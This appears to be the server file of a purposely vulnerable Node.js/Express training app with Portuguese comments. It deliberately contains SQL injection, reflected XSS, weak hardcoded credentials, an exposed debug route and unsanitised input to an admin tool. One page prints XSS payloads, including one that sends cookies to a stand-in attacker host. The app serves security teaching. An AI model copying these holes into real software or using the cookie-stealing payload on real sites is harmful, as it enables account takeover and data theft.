const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const session = require('express-session');
const path = require('path');
const { spawn } = require('child_process');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(session({
    secret: 'weak-secret-key', // Vulnerabilidade: chave fraca
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Vulnerabilidade: cookie não seguro
}));

// Inicializar banco de dados SQLite
const db = new sqlite3.Database('./database.db');

// Criar tabelas se não existirem
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        role TEXT DEFAULT 'user'
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        title TEXT,
        content TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )`);

    // Inserir usuários padrão com senhas fracas (vulnerabilidade)
    db.run(`INSERT OR IGNORE INTO users (username, password, role) VALUES 
        ('admin', 'admin123', 'admin'),
        ('user1', 'password', 'user'),
        ('guest', '123456', 'user')`);

    // Inserir algumas mensagens de exemplo
    db.run(`INSERT OR IGNORE INTO messages (user_id, title, content) VALUES 
        (1, 'Welcome Admin', 'Esta é uma mensagem administrativa confidencial'),
        (2, 'Hello User', 'Esta é uma mensagem normal do usuário'),
        (3, 'Test Message', 'Mensagem de teste do guest')`);
});

// Rotas
app.get('/', (req, res) => {
    if (req.session.user) {
        if (req.session.user.role === 'admin') {
            res.redirect('/dashboard');
        } else {
            res.redirect('/messages');
        }
    } else {
        res.sendFile(path.join(__dirname, 'public', 'login.html'));
    }
});

// Login - VULNERÁVEL A SQL INJECTION
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Vulnerabilidade: SQL Injection - consulta não preparada
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    
    db.get(query, (err, user) => {
        if (err) {
            console.error('Database error:', err);
            res.status(500).send('Erro interno do servidor');
            return;
        }
        
        if (user) {
            req.session.user = user;
            if (user.role === 'admin') {
                res.redirect('/dashboard');
            } else {
                res.redirect('/messages');
            }
        } else {
            res.send('<script>alert("Credenciais inválidas!"); window.location="/";</script>');
        }
    });
});

// Dashboard do Admin - controle de acesso fraco
app.get('/dashboard', (req, res) => {
    // Vulnerabilidade: verificação fraca de autorização
    if (!req.session.user) {
        res.redirect('/');
        return;
    }
    
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API para obter todos os usuários (apenas admin)
app.get('/api/users', (req, res) => {
    // Vulnerabilidade: sem verificação adequada de permissões
    if (!req.session.user || req.session.user.role !== 'admin') {
        res.status(403).json({ error: 'Acesso negado' });
        return;
    }
    
    db.all('SELECT id, username, role FROM users', (err, users) => {
        if (err) {
            res.status(500).json({ error: 'Erro no banco de dados' });
            return;
        }
        res.json(users);
    });
});

// Página de mensagens para usuários
app.get('/messages', (req, res) => {
    if (!req.session.user) {
        res.redirect('/');
        return;
    }
    
    res.sendFile(path.join(__dirname, 'public', 'messages.html'));
});

// API para obter mensagens do usuário
app.get('/api/messages', (req, res) => {
    if (!req.session.user) {
        res.status(401).json({ error: 'Não autenticado' });
        return;
    }
    
    const userId = req.session.user.id;
    
    // Vulnerabilidade: possível acesso a mensagens de outros usuários
    const query = `SELECT * FROM messages WHERE user_id = ${userId}`;

    //sanitizaQuery(query)
    
    db.all(query, (err, messages) => {
        if (err) {
            res.status(500).json({ error: 'Erro no banco de dados' });
            return;
        }
        res.json(messages);
    });
});

// Rota para criar nova mensagem - VULNERÁVEL A XSS REFLECTED
app.post('/create-message', (req, res) => {
    if (!req.session.user) {
        res.redirect('/');
        return;
    }
    
    const { title, content } = req.body;
    const userId = req.session.user.id;
    
    if (!title || !content) {
        // Vulnerabilidade XSS Reflected: dados não sanitizados refletidos na resposta
        res.send(`
            <html>
                <head>
                    <title>Erro - Mensagem</title>
                    <link rel="stylesheet" href="/style.css">
                </head>
                <body>
                    <div class="container">
                        <div class="error-message">
                            <h2>⚠️ Erro ao criar mensagem</h2>
                            <p>Título informado: <strong>${title || 'Não informado'}</strong></p>
                            <p>Conteúdo informado: <strong>${content || 'Não informado'}</strong></p>
                            <p>Todos os campos são obrigatórios!</p>
                            <a href="/messages">← Voltar às mensagens</a>
                        </div>
                    </div>
                </body>
            </html>
        `);
        return;
    }
    
    // Inserir mensagem no banco (também vulnerável a SQL injection)
    const query = `INSERT INTO messages (user_id, title, content) VALUES (${userId}, '${title}', '${content}')`;
    
    db.run(query, function(err) {
        if (err) {
            console.error('Erro ao inserir mensagem:', err);
            res.send(`
                <html>
                    <head>
                        <title>Erro - Banco de Dados</title>
                        <link rel="stylesheet" href="/style.css">
                    </head>
                    <body>
                        <div class="container">
                            <div class="error-message">
                                <h2>💥 Erro no banco de dados</h2>
                                <p>Título: <strong>${title}</strong></p>
                                <p>Erro: ${err.message}</p>
                                <a href="/messages">← Voltar às mensagens</a>
                            </div>
                        </div>
                    </body>
                </html>
            `);
            return;
        }
        
        // Sucesso - também vulnerável a XSS reflected
        res.send(`
            <html>
                <head>
                    <title>Mensagem Criada</title>
                    <link rel="stylesheet" href="/style.css">
                </head>
                <body>
                    <div class="container">
                        <div class="success-message">
                            <h2>✅ Mensagem criada com sucesso!</h2>
                            <p>Título: <strong>${title}</strong></p>
                            <p>Conteúdo: <strong>${content}</strong></p>
                            <p>ID da mensagem: ${this.lastID}</p>
                            <a href="/messages">← Voltar às mensagens</a>
                        </div>
                    </div>
                </body>
            </html>
        `);
    });
});

// Rota para visualizar mensagem específica - VULNERÁVEL A XSS REFLECTED
app.get('/view-message', (req, res) => {
    if (!req.session.user) {
        res.redirect('/');
        return;
    }
    
    const { search, highlight } = req.query;
    
    // Vulnerabilidade XSS Reflected: parâmetros de query refletidos sem sanitização
    res.send(`
        <html>
            <head>
                <title>Buscar Mensagens</title>
                <link rel="stylesheet" href="/style.css">
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔍 Buscar Mensagens</h1>
                        <a href="/messages">← Voltar às mensagens</a>
                    </div>
                    
                    <div class="search-form">
                        <h3>Buscar por termo:</h3>
                        <form method="GET" action="/view-message">
                            <input type="text" name="search" placeholder="Digite o termo de busca" value="${search || ''}" />
                            <input type="text" name="highlight" placeholder="Termo para destacar" value="${highlight || ''}" />
                            <button type="submit">🔍 Buscar</button>
                        </form>
                    </div>
                    
                    ${search ? `
                        <div class="search-results">
                            <h3>📋 Resultados da busca</h3>
                            <p>Você pesquisou por: <strong>${search}</strong></p>
                            ${highlight ? `<p>Destacando: <em>${highlight}</em></p>` : ''}
                            <div class="vulnerability-demo">
                                <h4>🎯 Demonstração de XSS Reflected</h4>
                                <p>Termo pesquisado será executado: ${search}</p>
                                ${highlight ? `<p>Destaque aplicado: ${highlight}</p>` : ''}
                            </div>
                        </div>
                    ` : ''}
                    
                    <div class="vulnerability-info">
                        <h3>🔥 Como explorar esta vulnerabilidade:</h3>
                        <ol>
                            <li>Digite um payload XSS no campo de busca: <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code></li>
                            <li>Use o campo highlight para executar JavaScript: <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></li>
                            <li>Para vazar o cookie do admin, use: <code>&lt;script&gt;document.location='http://atacante.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code></li>
                        </ol>
                        
                        <div class="cookie-info">
                            <h4>🍪 Cookie atual (para demonstração):</h4>
                            <script>document.write('Cookie: ' + document.cookie);</script>
                        </div>
                    </div>
                </div>
            </body>
        </html>
    `);
});

// Página de exemplos de XSS
app.get('/xss-examples', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'xss_examples.html'));
});

// Logout
app.post('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// Rota para visualizar informações da sessão (vulnerabilidade de debug)
app.get('/debug', (req, res) => {
    res.json({
        session: req.session,
        headers: req.headers,
        ip: req.ip
    });
});

// Rota para executar ferramenta administrativa em C (vulnerável a buffer overflow)
app.post('/admin-tool', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        res.status(403).json({ error: 'Acesso negado - apenas administradores' });
        return;
    }
    
    const { comando } = req.body;
    
    if (!comando) {
        res.status(400).json({ error: 'Comando não fornecido' });
        return;
    }
    
    // Vulnerabilidade: execução de comando sem sanitização adequada
    const adminTool = spawn('./admin_tool', [comando], {
        timeout: 5000,
        cwd: __dirname
    });
    
    let output = '';
    let error = '';
    
    adminTool.stdout.on('data', (data) => {
        output += data.toString();
    });
    
    adminTool.stderr.on('data', (data) => {
        error += data.toString();
    });
    
    adminTool.on('close', (code) => {
        res.json({
            comando: comando,
            output: output,
            error: error,
            exitCode: code
        });
    });
    
    adminTool.on('error', (err) => {
        res.status(500).json({
            error: 'Erro ao executar ferramenta administrativa',
            details: err.message
        });
    });
});

app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
    console.log('ATENÇÃO: Esta é uma aplicação PROPOSITALMENTE VULNERÁVEL para fins educativos!');
});